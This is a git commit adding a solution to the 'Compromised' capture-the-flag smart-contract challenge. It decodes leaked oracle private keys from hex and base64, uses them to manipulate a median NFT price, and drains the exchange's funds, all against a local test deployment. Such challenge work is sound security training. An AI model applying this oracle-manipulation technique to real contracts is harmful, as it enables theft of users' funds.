0f7b0e130937de5a8ca05fc329fac55f3327d682
= <caleb@stcroixwebagency.com>
2022-09-14 23:30:59 -0500

    Compromised PASSED

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -61,6 +61,88 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        /* Oracle 1
+            Hexadecimal: 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 
+            31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 
+            42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 
+            54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+            Base64: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+
+            ASCII: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        */
+
+        /* Oracle 2
+            Hexadecimal: 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 
+            6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 
+            6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 
+            7a 59 7a 4e 44 42 69 59 6a 51 34
+
+            Base64: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+
+            ASCII: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        */
+
+        const key1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        const key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
+        const oracle1 = new ethers.Wallet(key1, ethers.provider);
+        const oracle2 = new ethers.Wallet(key2, ethers.provider);
+
+        const orc1Trust = this.oracle.connect(oracle1);
+        const orc2Trust = this.oracle.connect(oracle2);
+
+        const setMedianPrice = async (amount) => {
+            // Before
+            let currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+
+            console.log("Posting to oracle 1");
+            await orc1Trust.postPrice("DVNFT", amount);
+
+            // After oracle 1
+            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+
+            console.log("Posting to oracle 2");
+            await orc2Trust.postPrice("DVNFT", amount);
+
+            // After oracle 2
+            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+        }
+
+        // Set price to 0.01
+        let priceToSet = ethers.utils.parseEther("0.01");
+        await setMedianPrice(priceToSet);
+
+        const attackExchange = this.exchange.connect(attacker);
+        const attackNFT = this.nftToken.connect(attacker);
+
+        await attackExchange.buyOne({
+            value: priceToSet
+        });
+
+        const tokenId = 0;
+        const ownerId = await attackNFT.ownerOf(tokenId);
+        expect(ownerId).to.equal(attacker.address);
+
+        console.log("Setting price to balance of exchange");
+        const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
+
+        // Set the price of the NFT to the current balance of the exchange
+        priceToSet = balOfExchange;
+        await setMedianPrice(priceToSet);
+
+        console.log("Selling NFT for the median price");
+        await attackNFT.approve(attackExchange.address, tokenId);
+        await attackExchange.sellOne(tokenId);
+
+        // Reset oracle price to initial price to meet final condition
+        priceToSet = INITIAL_NFT_PRICE;
+        await setMedianPrice(priceToSet);
+
     });
 
     after(async function () {
